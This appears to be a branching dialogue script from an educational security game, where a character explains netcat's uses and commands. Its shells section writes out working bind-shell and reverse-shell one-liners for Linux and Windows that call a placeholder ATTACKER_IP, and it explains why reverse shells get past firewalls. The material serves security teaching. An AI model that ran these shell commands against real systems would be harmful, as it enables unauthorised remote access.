// Netcat Tool - Reusable Explanations
// Used in intro_linux and vulnerabilities scenarios

=== netcat_what_is_it ===
Haxolottle: Netcat is the Swiss Army knife of networking, little axolotl.

Haxolottle: It can read and write data across network connections - TCP or UDP.

Haxolottle: People call it "nc" for short, and it's on basically every Linux system.

+ [What can I use it for?]
    -> netcat_uses

+ [How do I use it?]
    -> netcat_basic_usage

+ [Got it]
    -> DONE

=== netcat_uses ===
Haxolottle: Netcat does a ton of things:

Haxolottle: Port scanning: Check if a port is open

Haxolottle: File transfer: Send files between systems

Haxolottle: Banner grabbing: Connect to services and see what they say

Haxolottle: Bind shells: Listen for connections and serve up a shell

Haxolottle: Reverse shells: Connect back to an attacker and give them a shell

+ [Tell me about shells]
    -> netcat_shells

+ [How do I use these features?]
    -> netcat_basic_usage

+ [I understand]
    -> DONE

=== netcat_basic_usage ===
Haxolottle: Basic netcat commands:

Haxolottle: Connect to a port: nc TARGET_IP PORT

Haxolottle: Listen on a port: nc -l -p PORT or nc -lvp PORT

Haxolottle: Send a file: nc -w 1 TARGET_IP PORT < file.txt

Haxolottle: Receive a file: nc -l -p PORT > file.txt

+ [What's the -l flag?]
    Haxolottle: The -l flag means "listen" - act as a server instead of a client.

    Haxolottle: Without -l, netcat connects TO something.

    Haxolottle: With -l, netcat waits FOR something to connect.

+ [Tell me about shells]
    -> netcat_shells

+ [That's clear]
    -> DONE

=== netcat_shells ===
Haxolottle: Netcat can create shells - command line access to remote systems.

Haxolottle: **Bind shell**: Target listens, you connect.

Haxolottle: On target: nc -l -p 4444 -e /bin/bash (Linux) or nc.exe -l -p 4444 -e cmd.exe (Windows)

Haxolottle: On attacker: nc TARGET_IP 4444

Haxolottle: **Reverse shell**: You listen, target connects to you.

Haxolottle: On attacker: nc -l -p 4444

Haxolottle: On target: nc ATTACKER_IP 4444 -e /bin/bash (Linux) or nc.exe ATTACKER_IP 4444 -e cmd.exe (Windows)

+ [Why would I use one over the other?]
    Haxolottle: Bind shells are simpler but firewalls usually block incoming connections.

    Haxolottle: Reverse shells bypass firewalls because the target initiates the connection outbound.

    Haxolottle: In real attacks, reverse shells are much more reliable.

+ [What's the -e flag doing?]
    Haxolottle: The -e flag executes a program and pipes all connection data through it.

    Haxolottle: So -e /bin/bash means "run bash and send everything through this connection."

    Haxolottle: The attacker types commands, they go through netcat to bash, output comes back.

    Haxolottle: Note: Not all netcat versions support -e for security reasons.

+ [I get it now]
    -> DONE
